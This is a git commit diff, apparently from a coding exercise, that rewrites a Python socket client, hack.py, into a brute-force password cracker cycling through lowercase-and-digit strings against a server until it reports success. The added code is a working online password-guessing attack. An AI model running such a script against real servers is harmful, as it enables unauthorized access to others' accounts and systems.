0805874b794f4b089e6ab1d1639d858fec8d3212
Jacek Spalinski <jfspalinski@gmail.com>
2024-04-24 15:25:20 +0200

    Crack password using brute force

--- hack.py
+++ hack.py
@@ -1,24 +1,43 @@
 import sys
 import socket
-from typing import Tuple
+import itertools
+import string
+from typing import Tuple, Generator
 
-BUFFER_SIZE = 1024
+BUFFER_SIZE = 32
+CHARACTERS = string.ascii_lowercase + string.digits
+SUCCESS_MESSAGE = "Connection success!"
+TOO_MANY_ATTEMPTS_MESSAGE = "Too many attempts."
 
 
-def parse_args() -> Tuple[str, int, str]:
+def parse_args() -> Tuple[str, int]:
     args = sys.argv
-    assert len(args) == 4, f"Expected exactly 3 program arguments, received {len(args) - 1}!"
-    ip_address, port, message = args[1], int(args[2]), args[3]
-    return ip_address, port, message
+    assert len(args) == 3, f"Expected exactly 2 program arguments, received {len(args) - 1}!"
+    ip_address, port = args[1], int(args[2])
+    return ip_address, port
 
 
-def main():locals()
-    ip_address, port, message = parse_args()
+def password_generator() -> Generator[str, None, None]:
+    password_len = 1
+    while True:
+        for password in itertools.product(CHARACTERS, repeat=password_len):
+            yield "".join(password)
+        password_len += 1
+
+
+def main():
+    ip_address, port = parse_args()
+    passwords = password_generator()
+    server_response = ""
     with socket.socket() as my_socket:
         my_socket.connect((ip_address, port))
-        my_socket.send(message.encode())
-        response = my_socket.recv(1024)
-        print(response.decode())
+        while server_response != SUCCESS_MESSAGE:
+            password = next(passwords)
+            my_socket.send(password.encode())
+            server_response = my_socket.recv(BUFFER_SIZE).decode()
+            if server_response == TOO_MANY_ATTEMPTS_MESSAGE:
+                raise Exception(TOO_MANY_ATTEMPTS_MESSAGE)
+    print(password)
 
 
 if __name__ == "__main__":
